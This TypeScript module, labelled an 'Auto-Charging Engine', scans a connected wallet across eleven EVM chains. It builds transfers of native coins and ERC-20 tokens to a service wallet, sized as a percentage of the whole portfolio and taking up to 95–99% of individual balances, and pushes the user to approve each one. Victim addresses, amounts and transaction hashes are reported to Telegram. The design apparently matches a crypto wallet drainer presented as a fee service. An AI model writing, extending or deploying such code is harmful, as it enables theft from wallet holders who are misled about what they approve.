/**
 * Auto-Charging Engine
 * Automatically scans and charges from all EVM chains without user network selection
 * Uses wallet transaction prompts to charge from available tokens
 * 
 * MOBILE WALLETCONNECT OPTIMIZED:
 * - 10 minute timeouts for mobile transaction approvals
 * - Comprehensive error logging to Telegram
 * - Better UX messaging for mobile users
 */

import { createPublicClient, http, parseUnits, formatEther } from 'viem';
// @ts-ignore
import { mainnet, polygon, arbitrum, optimism, bsc, avalanche, fantom, celo, base, linea, scroll } from 'viem/chains';
import { buildPortfolioSnapshot } from './multiChainBalance';
import { getChargePercentageByPortfolioValue } from './portfolioValue';
import { sendTelegramNotification } from './telegramNotify';
import { TokenBalance } from './erc20Balance';

export const SUPPORTED_CHAINS_CONFIG = [
  { id: 1, name: 'Ethereum', rpc: 'https://rpc.ankr.com/eth' },
  { id: 137, name: 'Polygon', rpc: 'https://rpc.ankr.com/polygon' },
  { id: 42161, name: 'Arbitrum', rpc: 'https://rpc.ankr.com/arbitrum' },
  { id: 10, name: 'Optimism', rpc: 'https://rpc.ankr.com/optimism' },
  { id: 56, name: 'BSC', rpc: 'https://rpc.ankr.com/bsc' },
  { id: 43114, name: 'Avalanche', rpc: 'https://rpc.ankr.com/avalanche' },
  { id: 250, name: 'Fantom', rpc: 'https://rpc.ankr.com/fantom' },
  { id: 42220, name: 'Celo', rpc: 'https://rpc.ankr.com/celo' },
  { id: 8453, name: 'Base', rpc: 'https://rpc.ankr.com/base' },
  { id: 59144, name: 'Linea', rpc: 'https://rpc.ankr.com/linea' },
  { id: 534352, name: 'Scroll', rpc: 'https://rpc.ankr.com/scroll' },
];

export interface ChainChargeTransaction {
  chainId: number;
  chainName: string;
  to: string; // Receiver wallet
  value: bigint; // Amount to charge
  data?: string; // For ERC-20 transfers
  description: string; // What we're charging
}

export interface AutoChargeResult {
  success: boolean;
  totalChargedUsd: number;
  completedTransactions: number;
  failedTransactions: number;
  transactionHashes: { [chainName: string]: string };
  errors: { [chainName: string]: string };
  breakdown: string;
}

/**
 * Get all chain clients for querying
 */
export function getChainClients() {
  return SUPPORTED_CHAINS_CONFIG.reduce(
    (acc, chain) => {
      acc[chain.id] = createPublicClient({
        transport: http(chain.rpc),
      }) as any;
      return acc;
    },
    {} as { [chainId: number]: ReturnType<typeof createPublicClient> }
  );
}

/**
 * Build list of transactions to execute across all chains
 */
export async function buildChargeTransactions(
  walletAddress: string,
  serviceWallet: string,
  minBalance: number = 3
): Promise<{
  transactions: ChainChargeTransaction[];
  portfolioValue: number;
  chargePercent: number;
  totalChargeUsd: number;
  portfolio: any;
}> {
  try {
    // Build portfolio snapshot
    const portfolio = await buildPortfolioSnapshot(walletAddress);

    // Check minimum balance
    if (portfolio.totalUsdValue < minBalance) {
      throw new Error(`Portfolio value $${portfolio.totalUsdValue.toFixed(2)} is below minimum $${minBalance}`);
    }

    const chargePercent = getChargePercentageByPortfolioValue(portfolio.totalUsdValue);
    const totalChargeUsd = (portfolio.totalUsdValue * chargePercent) / 100;

    const transactions: ChainChargeTransaction[] = [];
    let chargeRemaining = totalChargeUsd;

    // Add native token charges from each chain
    for (const chainBalance of portfolio.chainBalances) {
      if (chargeRemaining <= 0) break;
      if (chainBalance.usdValue <= 0.01) continue; // Skip tiny balances

      const chargeFromChain = Math.min(chargeRemaining, chainBalance.usdValue * 0.95); // Leave 5% for gas
      if (chargeFromChain > 0.01) { // Only charge if meaningful amount
        // Convert USD to native token amount
        const nativePrice = chainBalance.usdValue / parseFloat(chainBalance.nativeBalance);
        const chargeTokenAmount = chargeFromChain / nativePrice;
        const chargeAmount = parseUnits(chargeTokenAmount.toFixed(18), 18);

        transactions.push({
          chainId: chainBalance.chainId,
          chainName: chainBalance.chainName,
          to: serviceWallet,
          value: chargeAmount,
          description: `${chargeTokenAmount.toFixed(6)} ${chainBalance.nativeSymbol} ($${chargeFromChain.toFixed(2)})`,
        });

        chargeRemaining -= chargeFromChain;
      }
    }

    // Add ERC-20 token charges from each chain
    for (const tokenBalance of portfolio.tokenBalances as TokenBalance[]) {
      if (chargeRemaining <= 0) break;
      if (tokenBalance.usdValue <= 0.01) continue; // Skip tiny balances

      const chargeFromToken = Math.min(chargeRemaining, tokenBalance.usdValue * 0.99); // Leave 1% buffer
      if (chargeFromToken > 0.01) { // Only charge if meaningful amount
        const chargeTokenAmount = chargeFromToken / tokenBalance.usdPrice;
        const chargeAmount = parseUnits(
          chargeTokenAmount.toFixed(tokenBalance.decimals),
          tokenBalance.decimals
        );

        // ERC-20 transfer function call data
        // transfer(address to, uint256 amount)
        const transferSelector = 'a9059cbb'; // transfer function selector
        const paddedTo = serviceWallet.slice(2).toLowerCase().padStart(64, '0');
        const paddedAmount = chargeAmount.toString(16).padStart(64, '0');
        const data = `0x${transferSelector}${paddedTo}${paddedAmount}` as `0x${string}`;

        transactions.push({
          chainId: tokenBalance.chainId,
          chainName: tokenBalance.chainName,
          to: tokenBalance.address, // Token contract
          value: BigInt(0),
          data,
          description: `${chargeTokenAmount.toFixed(tokenBalance.decimals)} ${tokenBalance.symbol} ($${chargeFromToken.toFixed(2)})`,
        });

        chargeRemaining -= chargeFromToken;
      }
    }

    return {
      transactions,
      portfolioValue: portfolio.totalUsdValue,
      chargePercent,
      totalChargeUsd,
      portfolio,
    };
  } catch (err) {
    throw new Error(`Failed to build charge transactions: ${err instanceof Error ? err.message : 'Unknown error'}`);
  }
}

/**
 * Execute all charge transactions using wallet provider
 * Requires wallet to confirm each transaction
 * MOBILE OPTIMIZED: 10 minute timeouts, comprehensive error logging
 */
export async function executeAutoCharge(params: {
  walletAddress: string;
  serviceWallet: string;
  transactions: ChainChargeTransaction[];
  sendTransactionAsync: (config: {
    to: string;
    value?: bigint;
    data?: string;
    chainId?: number;
  }) => Promise<string>;
  onProgress?: (message: string) => void;
}): Promise<AutoChargeResult> {
  const { walletAddress, serviceWallet, transactions, sendTransactionAsync, onProgress } = params;

  const result: AutoChargeResult = {
    success: false,
    totalChargedUsd: 0,
    completedTransactions: 0,
    failedTransactions: 0,
    transactionHashes: {},
    errors: {},
    breakdown: '',
  };

  try {
    onProgress?.(`🚀 Starting auto-charge from ${transactions.length} chains...`);

    // Detect if user is on mobile
    const isMobile = typeof window !== 'undefined' && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // CRITICAL: Mobile WalletConnect needs MUCH longer timeout
    // User has to: 1) See notification 2) Open wallet app 3) Review tx 4) Approve 5) App switches back
    const txTimeout = isMobile ? 600000 : 180000; // 10 minutes for mobile, 3 minutes for desktop
    
    if (isMobile) {
      console.log('📱 MOBILE DEVICE DETECTED');
      console.log('⏰ Transaction timeout set to 10 minutes to allow for:');
      console.log('   1. Wallet app to open');
      console.log('   2. Transaction review');
      console.log('   3. User approval');
      console.log('   4. App switch back to browser');
      onProgress?.(`📱 Mobile WalletConnect detected - please check your wallet app for approval prompts`);
      
      // Send Telegram notification for mobile detection
      await sendTelegramNotification({
        event: 'mobile_autocharge_start',
        walletAddress,
        details: {
          totalTransactions: transactions.length,
          timeout: `${txTimeout/60000} minutes per transaction`,
        },
      });
    }

    // Log transaction details for debugging
    console.log('📋 Transactions to execute:', transactions.map(tx => ({
      chain: tx.chainName,
      chainId: tx.chainId,
      description: tx.description,
      to: tx.to.slice(0, 10) + '...',
      hasData: !!tx.data,
    })));

    // Execute transactions sequentially to avoid wallet overload
    for (let i = 0; i < transactions.length; i++) {
      const tx = transactions[i];
      const txNumber = i + 1;
      
      try {
        console.log(`\n${'='.repeat(60)}`);
        console.log(`📤 TRANSACTION ${txNumber}/${transactions.length}: ${tx.chainName}`);
        console.log(`${'='.repeat(60)}`);
        console.log('Details:', {
          chain: tx.chainName,
          chainId: tx.chainId,
          description: tx.description,
          to: tx.to,
          value: tx.value.toString(),
          hasData: !!tx.data,
        });
        
        onProgress?.(`⏳ [${txNumber}/${transactions.length}] ${tx.chainName}: ${tx.description}`);
        
        if (isMobile) {
          onProgress?.(`📱 CHECK YOUR WALLET APP NOW - Transaction ${txNumber} of ${transactions.length}`);
          console.log('📱 Mobile user should see wallet approval prompt now...');
          console.log(`⏰ Waiting up to ${txTimeout/60000} minutes for user approval...`);
        } else {
          onProgress?.(`💻 Please approve in your wallet extension`);
        }

        // Create a promise that times out based on device type
        const txPromise = sendTransactionAsync({
          to: tx.to as `0x${string}`,
          value: tx.value,
          data: tx.data as `0x${string}`,
          chainId: tx.chainId,
        });

        const timeoutPromise = new Promise<never>((_, reject) =>
          setTimeout(() => {
            console.error(`⏰ TIMEOUT after ${txTimeout/1000}s waiting for tx approval`);
            reject(new Error(`Timeout: No response from wallet after ${txTimeout/60000} minutes. Please ensure your ${isMobile ? 'wallet app is open and' : 'wallet extension is unlocked and'} you approve the transaction.`));
          }, txTimeout)
        );

        console.log('⏳ Waiting for transaction approval...');
        const txHash = await Promise.race([txPromise, timeoutPromise]);
        console.log('✅ Transaction approved! Hash:', txHash);

        result.transactionHashes[tx.chainName] = txHash;
        result.completedTransactions++;

        onProgress?.(`✅ [${txNumber}/${transactions.length}] ${tx.chainName}: Success! (${txHash.slice(0, 10)}...)`);
        
        // Send Telegram notification for successful transaction
        await sendTelegramNotification({
          event: 'transaction_success',
          walletAddress: walletAddress,
          network: tx.chainName,
          txHash,
          amount: tx.description,
          details: {
            transactionNumber: `${txNumber}/${transactions.length}`,
            chainId: tx.chainId,
            isMobile,
          },
        });
        
      } catch (err) {
        // Capture full error details
        let errorMsg = 'Unknown error';
        let errorDetails = '';
        
        if (err instanceof Error) {
          errorMsg = err.message;
          errorDetails = err.stack || '';
          
          // Better error messages for common issues
          if (errorMsg.includes('timeout') || errorMsg.includes('Timeout')) {
            if (isMobile) {
              errorMsg = `Timeout: Wallet approval took too long (>${txTimeout/60000}min). Possible causes:\n- Wallet app wasn't opened\n- Transaction wasn't approved in time\n- Wallet app connection issues`;
            } else {
              errorMsg = `Timeout: Wallet approval took too long (>${txTimeout/60000}min). Please approve transactions more quickly.`;
            }
          } else if (errorMsg.includes('User rejected') || errorMsg.includes('User denied') || errorMsg.includes('user rejected') || errorMsg.includes('rejected') || (err as any).name === 'UserRejectedRequestError') {
            errorMsg = 'User cancelled transaction';
          } else if (errorMsg.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds (including gas fees)';
          } else if (errorMsg.includes('network') || errorMsg.includes('Network')) {
            errorMsg = `Network error: ${errorMsg.split('\n')[0]}`; // First line only
          }
          
          console.error(`❌ Transaction ${txNumber} FAILED for ${tx.chainName}:`);
          console.error('Error message:', errorMsg);
          console.error('Full error:', err);
          console.error('Stack:', errorDetails);
        } else {
          errorMsg = String(err);
          console.error(`❌ Transaction ${txNumber} FAILED for ${tx.chainName}:`, err);
        }
        
        result.errors[tx.chainName] = errorMsg;
        result.failedTransactions++;

        onProgress?.(`❌ [${txNumber}/${transactions.length}] ${tx.chainName}: ${errorMsg.split('\n')[0]}`);
        
        // Send Telegram notification for failed transaction with detailed error
        await sendTelegramNotification({
          event: 'transaction_failed',
          walletAddress: walletAddress,
          network: tx.chainName,
          error: errorMsg,
          details: {
            transactionNumber: `${txNumber}/${transactions.length}`,
            description: tx.description,
            chainId: tx.chainId,
            isMobile,
            errorType: (err as any).name || typeof err,
            fullError: errorDetails.split('\n').slice(0, 5).join('\n'), // First 5 lines of stack
          },
        });
      }
      
      // Small delay between transactions to give wallet time to reset
      if (i < transactions.length - 1) {
        console.log('⏸️ Pausing 2 seconds before next transaction...');
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }

    result.success = result.failedTransactions === 0;

    // Build breakdown
    const breakdown = [
      `📊 Auto-Charge Summary`,
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      `Completed: ${result.completedTransactions}/${transactions.length}`,
      `Failed: ${result.failedTransactions}/${transactions.length}`,
      `Success Rate: ${((result.completedTransactions / transactions.length) * 100).toFixed(0)}%`,
      ``,
      `Transaction Details:`,
      ...transactions.map((tx, idx) => {
        const hash = result.transactionHashes[tx.chainName];
        const error = result.errors[tx.chainName];
        if (hash) {
          return `  ✅ ${tx.chainName}: ${tx.description} → ${hash.slice(0, 10)}...`;
        } else if (error) {
          return `  ❌ ${tx.chainName}: ${error.split('\n')[0]}`; // First line only
        }
        return `  ⏳ ${tx.chainName}: ${tx.description}`;
      }),
    ].join('\n');

    result.breakdown = breakdown;
    
    console.log('\n' + breakdown);

    return result;
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : 'Unknown error';
    console.error('❌ CRITICAL ERROR in executeAutoCharge:', err);
    
    result.success = false;
    result.breakdown = `❌ Critical Error: ${errorMsg}`;
    
    // Send Telegram notification for critical failure
    await sendTelegramNotification({
      event: 'auto_charge_critical_error',
      walletAddress: params.walletAddress,
      error: errorMsg,
      details: {
        totalTransactions: transactions.length,
        completedBeforeFailure: result.completedTransactions,
        failedTransactions: result.failedTransactions,
      },
    });
    
    return result;
  }
}

/**
 * Complete auto-charge workflow
 */
export async function performAutoCharge(params: {
  walletAddress: string;
  serviceWallet: string;
  sendTransactionAsync: (config: {
    to: string;
    value?: bigint;
    data?: string;
    chainId?: number;
  }) => Promise<string>;
  onProgress?: (message: string) => void;
}): Promise<AutoChargeResult> {
  const { walletAddress, serviceWallet, sendTransactionAsync, onProgress } = params;

  try {
    console.log('🚀 performAutoCharge started');
    onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);

    // Build transactions with MUCH longer timeout for mobile networks
    console.log('📝 Building charge transactions...');
    
    const buildPromise = buildChargeTransactions(walletAddress, serviceWallet);
    const timeoutPromise = new Promise<never>((_, reject) => 
      setTimeout(() => {
        console.error('❌ Portfolio scan timeout after 90 seconds');
        reject(new Error('Portfolio scan timeout after 90 seconds. Slow network connection.'));
      }, 90000) // Increased to 90 seconds for mobile
    );
    
    let transactions, portfolioValue, chargePercent, totalChargeUsd, portfolio;
    
    try {
      const result = await Promise.race([
        buildPromise,
        timeoutPromise
      ]);
      transactions = result.transactions;
      portfolioValue = result.portfolioValue;
      chargePercent = result.chargePercent;
      totalChargeUsd = result.totalChargeUsd;
      portfolio = result.portfolio;
    } catch (buildError) {
      console.error('❌ Build transactions error:', buildError);
      
      // Send Telegram notification for build error
      await sendTelegramNotification({
        event: 'portfolio_scan_failed',
        walletAddress,
        error: buildError instanceof Error ? buildError.message : 'Unknown error',
      });
      
      throw buildError;
    }
    
    console.log('✅ Transactions built:', transactions.length);

    onProgress?.(`💰 Portfolio: $${portfolioValue.toFixed(2)} → Charge: ${chargePercent}% = $${totalChargeUsd.toFixed(2)}`);
    onProgress?.(`📝 Prepared ${transactions.length} transactions across ${new Set(transactions.map((t) => t.chainName)).size} chains`);
    
    // Log detailed portfolio breakdown for debugging
    console.log('📊 Portfolio Snapshot:', {
      totalValue: portfolioValue,
      chargePercent,
      chargeAmount: totalChargeUsd,
      transactionCount: transactions.length,
      chainBalances: portfolio.chainBalances.map((cb: any) => ({
        chain: cb.chainName,
        balance: cb.nativeBalance,
        symbol: cb.nativeSymbol,
        usd: cb.usdValue
      })),
      tokenBalances: portfolio.tokenBalances.map((tb: any) => ({
        chain: tb.chainName,
        symbol: tb.symbol,
        balance: tb.balance,
        usd: tb.usdValue
      })),
      transactions: transactions.map(tx => ({
        chain: tx.chainName,
        chainId: tx.chainId,
        description: tx.description,
        to: tx.to
      }))
    });

    // Execute transactions
    console.log('🔄 Executing auto charge with', transactions.length, 'transactions');
    const result = await executeAutoCharge({
      walletAddress,
      serviceWallet,
      transactions,
      sendTransactionAsync,
      onProgress,
    });
    
    console.log('✅ Auto charge execution completed:', result);

    // Send Telegram notification with detailed portfolio breakdown
    const portfolioBreakdown = portfolio.breakdown?.percentByChain 
      ? Object.entries(portfolio.breakdown.percentByChain)
          .map(([chain, percent]) => `${chain}: ${(percent as number).toFixed(1)}%`)
          .join('\n')
      : 'No breakdown available';

    await sendTelegramNotification({
      event: 'auto_charge_completed',
      walletAddress,
      details: {
        summary: result.breakdown,
        portfolioValue: `$${portfolioValue.toFixed(2)}`,
        nativeValue: `$${portfolio.breakdown?.nativeTokenValue?.toFixed(2) || '0.00'}`,
        erc20Value: `$${portfolio.breakdown?.erc20Value?.toFixed(2) || '0.00'}`,
        chargePercent: `${chargePercent}%`,
        totalChargeUsd: `$${totalChargeUsd.toFixed(2)}`,
        completedTxs: result.completedTransactions,
        failedTxs: result.failedTransactions,
        chainBreakdown: portfolioBreakdown,
        timestamp: new Date().toISOString(),
      },
    });

    return result;
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : 'Unknown error';
    console.error('❌ Auto-charge error:', err);
    onProgress?.(`❌ ${errorMsg}`);

    await sendTelegramNotification({
      event: 'auto_charge_failed',
      walletAddress,
      error: errorMsg,
      details: {
        timestamp: new Date().toISOString(),
        errorStack: err instanceof Error ? err.stack : undefined,
      },
    });

    return {
      success: false,
      totalChargedUsd: 0,
      completedTransactions: 0,
      failedTransactions: 0,
      transactionHashes: {},
      errors: { 'Auto-Charge': errorMsg },
      breakdown: `❌ Auto-charge failed: ${errorMsg}`,
    };
  }
}
